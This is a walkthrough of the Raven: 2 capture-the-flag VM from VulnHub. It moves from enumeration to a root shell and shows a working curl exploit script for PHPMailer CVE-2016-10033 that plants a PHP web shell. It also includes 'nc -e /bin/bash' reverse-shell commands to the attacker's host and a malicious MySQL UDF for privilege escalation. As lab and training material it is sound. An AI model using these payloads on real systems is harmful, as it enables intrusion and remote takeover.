This post documents the complete walkthrough of Raven: 2, a boot2root VM created by William McCann, and hosted at VulnHub. If you are uncomfortable with spoilers, please stop reading now.

Background
Raven 2 is an intermediate level boot2root VM. There are four flags to capture. After multiple breaches, Raven Security has taken extra steps to harden their web server to prevent hackers from getting in. Can you still breach Raven?
Information Gathering
Letâs start with a nmap scan to establish the available services in the host.
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.30.129
...
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)

| rpcinfo:

38372/tcp open  status  syn-ack ttl 64 1 (RPC #100024)

nmap finds 22/tcp and 80/tcp open. Weâll put the rest of the open ports on the back burner.
Directory/File Enumeration
Letâs run through the host with nikto and see what we get.

Hmm. Looks like the site is using WordPress to power its blog. Based on my experience, itâs best to add raven.local to /etc/hosts.
Letâs run through the site with gobuster with one of the bigger directory lists and see what we get.
# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -u http://raven.local

Flag: 1
The /vendor directory seems interesting. What is it?



Notice the date/time of file PATH is more recent compared to the rest? Letâs take a look at it.



Thatâs our first flag.
PHPMailer &lt; 5.2.18 - Remote Command Execution
Looks like the site is also using PHPMailer 5.2.16.



And itâs used here.



PHPMailer versions before 5.2.18 is susceptible to remote command execution, as documented in CVE-2016-10033.
To that end, I wrote a bash script, using curl as the main driver for the exploit.
exploit.sh
#!/bin/bash

TARGET=http://raven.local/contact.php

DOCROOT=/var/www/html
FILENAME=backdoor.php
LOCATION=$DOCROOT/$FILENAME

STATUS=$(curl -s \
              --data-urlencode "name=Hackerman" \
              --data-urlencode "email=\"hackerman\\\" -oQ/tmp -X$LOCATION blah\"@badguy.com" \
              --data-urlencode "message=&lt;?php echo shell_exec(\$_GET['cmd']); ?&gt;" \
              --data-urlencode "action=submit" \
              $TARGET | sed -r '146!d')

if grep 'instantiate' &amp;&gt;/dev/null &lt;&lt;&lt;"$STATUS"; then
  echo "[+] Check ${LOCATION}?cmd=[shell command, e.g. id]"
else
  echo "[!] Exploit failed"
fi

The exploit, once executed, will create a PHP backdoor backdoor.php that allows remote command execution. Letâs give it a shot.



Awesome.



We need a better view.



Now, letâs see if the beloved nc with -e option is available.
Low-Privilege Shell
On our attacking machine, open a terminal and have nc listen at 1234/tcp.
# nc -lnvp 1234

On the browserâs address bar, enter the following command.



There you have it. A low-privilege shell.



Flag: 2
The second flag is at the home directory of www-data.



Flag: 3
The third flag is hidden within WordPress uploads.



Hereâs how it looks like.



Privilege Escalation
During enumeration of www-dataâs account, I notice that MySQL is running as root. But because this version of MySQL is 5.5, we canât use the popular EDB-ID 1518 user-defined function or UDF.
root       921  0.0 10.1 552000 51240 ?        Sl   01:02   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306




Iâve also gotten the database credentials from WordPress file wp-config.php to log in to MySQL.



No need to fret. Thereâs a GitHub repository that hosts many 5.5-compliant UDFs that I can use to finish the dirty deed. Iâve chosen lib_mysqludf_sys, a UDF library with functions to interact with the operating system.
According to the instructions, Iâll need MySQL development headers which is not available in the target host. Nonetheless, I can still compile the UDF library in my own machine.
On your attacking machine, use the following command to compile lib_mysqludf_sys:
# gcc -Wall -I/usr/include/mysql -shared -o lib_mysqludf_sys.so lib_mysqludf_sys.c

Host the file with Pythonâs SimpleHTTPServer module like so.
# python -m SimpleHTTPServer 80

On the shell, download the UDF library to /tmp.



Log in to the MySQL database mysql.



First, we need to load the library into a table and then dump it to the MySQL plugins directory /usr/lib/mysql/plugin as specified in the command-line shown above.



Time to create the functions! In fact, we only need to create one function sys_exec.



Letâs drop a root shell. Same thing. We set up a nc listener at 4321/tcp and use the sys_exec to execute nc 192.168.30.128 4321 -e /bin/bash.



Meanwhile, at the nc listener â¦



Boom.
Flag: 4
With a root shell, getting the final flag is trivial.




Afterthought
Good thing I went straight for Raven: 2 first.
